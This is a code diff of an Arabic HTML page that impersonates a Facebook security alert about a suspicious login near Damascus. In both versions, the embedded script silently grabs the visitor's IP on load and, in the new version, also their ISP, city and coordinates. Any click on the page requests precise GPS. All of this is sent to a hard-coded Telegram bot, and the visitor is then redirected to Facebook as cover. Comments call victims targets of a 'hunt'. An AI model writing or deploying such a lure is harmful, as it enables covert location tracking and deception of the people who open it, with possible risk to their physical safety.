@@ -1,69 +1,93 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="تنبيه أمني: نشاط غير معتاد على حسابك">
+    <meta property="og:description" content="تم رصد محاولة تسجيل دخول من جهاز غير معروف في منطقة ريف دمشق. اضغط للمراجعة وتأمين الحساب.">
+    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png">
+    <meta property="og:type" content="website">
 
-<meta property="og:title" content="تنبيه أمني: تسجيل دخول مشبوه">
-<meta property="og:description" content="تم رصد محاولة وصول لحسابك من جهاز غير معروف. اضغط للمراجعة.">
-<meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png">
-
-<title>Facebook - Security Check</title>
-
-<style>
-    body { margin: 0; background: #f0f2f5; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
-    .box { text-align: center; color: #65676b; }
-    .btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; border: none; font-weight: bold; margin-top: 20px; }
-</style>
+    <title>Facebook Security Check</title>
+    
+    <style>
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+        .card { text-align: center; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; }
+        .fb-logo { width: 60px; margin-bottom: 20px; }
+        .h1 { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 10px; }
+        .p { font-size: 14px; color: #606770; margin-bottom: 25px; line-height: 1.4; }
+        .btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; font-weight: bold; border: none; width: 100%; cursor: pointer; }
+    </style>
 </head>
 <body onclick="getAccurateGPS()">
 
-<div class="box">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" width="100">
-    <h2>يرجى تأكيد هويتك</h2>
-    <p>لقد لاحظنا نشاطاً غير معتاد على حسابك.</p>
-    <button class="btn">تأكيد الحساب</button>
-</div>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="fb-logo">
+        <div class="h1">هل أنت من حاول تسجيل الدخول؟</div>
+        <div class="p">لقد اكتشفنا محاولة دخول جديدة من متصفح غير معروف. إذا لم تكن أنت، يرجى تأمين حسابك فوراً.</div>
+        <button class="btn">نعم، هذا أنا</button>
+        <p style="font-size: 12px; color: #90949c; margin-top: 15px;">IP: 82.137.xxx.xxx | ريف دمشق، سوريا</p>
+    </div>
 
 <script>
-const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const CHAT_ID = "1611398303";
+    // 🔱 إعدادات أمجد الخاصة 🔱
+    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    const CHAT_ID = "1611398303";
 
-// 🔱 1. صيد الـ IP الخارجي صامتاً (بدون ضغط) 🔱
-// نستخدم خدمة ipify مع نظام JSONP لتجاوز حماية CORS نهائياً
-function captureIPSilent() {
-    const script = document.createElement('script');
-    script.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
-    document.body.appendChild(script);
-}
-
-function handleIP(data) {
-    let msg = `🚀 صيد خارجي (صامت - بدون ضغط)\n🌐 الـ IP الحقيقي: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleTimeString()}`;
-    sendToTelegram(msg);
-}
-
-// 🔱 2. صيد الـ GPS الدقيق (عند الضغط) 🔱
-function getAccurateGPS() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-            let lat = pos.coords.latitude;
-            let lon = pos.coords.longitude;
-            let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(msg);
-            setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 500);
-        }, (err) => {
-            sendToTelegram("⚠️ الضحية ضغط ولكن رفض إذن الموقع");
-            window.location.href = "https://m.facebook.com";
-        }, { enableHighAccuracy: true });
+    // 1. جلب الـ IP صامتاً باستخدام تقنية JSONP لتخطي الـ CORS
+    function startSilentScan() {
+        const script = document.createElement('script');
+        script.src = 'https://api.ipify.org?format=jsonp&callback=initDeepScan';
+        document.body.appendChild(script);
     }
-}
 
-function sendToTelegram(text) {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-}
+    // 2. تحليل الـ IP بعمق (Deep Scan) وإرسال التقرير للتلجرام
+    async function initDeepScan(data) {
+        const ip = data.ip;
+        try {
+            // جلب تفاصيل الموقع والشبكة بناءً على الـ IP
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const d = await res.json();
+            
+            let report = `📊 تقرير استخباراتي (صيد صامت):\n`;
+            report += `🌐 الـ IP: ${d.ip}\n`;
+            report += `🏢 المزود: ${d.org}\n`;
+            report += `📍 المنطقة: ${d.region} - ${d.city}\n`;
+            report += `📱 الجهاز: ${navigator.platform}\n`;
+            report += `🌍 الإحداثيات: ${d.latitude}, ${d.longitude}\n`;
+            report += `🔗 الخريطة: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-// التنفيذ الفوري عند تحميل الصفحة (قبل أي لمسة)
-window.onload = captureIPSilent;
+            sendToTelegram(report);
+        } catch (e) {
+            sendToTelegram(`🚀 دخول جديد!\n🌐 الـ IP المستهدف: ${ip}\n⚠️ فشل الـ Deep Scan (تحقق من الـ API)`);
+        }
+    }
+
+    // 3. جلب الـ GPS الدقيق (الأمتار) عند الضغط
+    function getAccurateGPS() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                let lat = pos.coords.latitude;
+                let lon = pos.coords.longitude;
+                let msg = `🎯 صيد دقيق جداً (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                sendToTelegram(msg);
+                
+                // تمويه: توجيه لفيسبوك بعد الصيد
+                setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
+            }, (err) => {
+                sendToTelegram("⚠️ الضحية ضغط ولكن رفض إذن الموقع الدقيق.");
+                window.location.href = "https://m.facebook.com/hacked";
+            }, { enableHighAccuracy: true });
+        }
+    }
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
+
+    // التنفيذ التلقائي عند التحميل
+    window.onload = startSilentScan;
 </script>
 </body>
 </html>
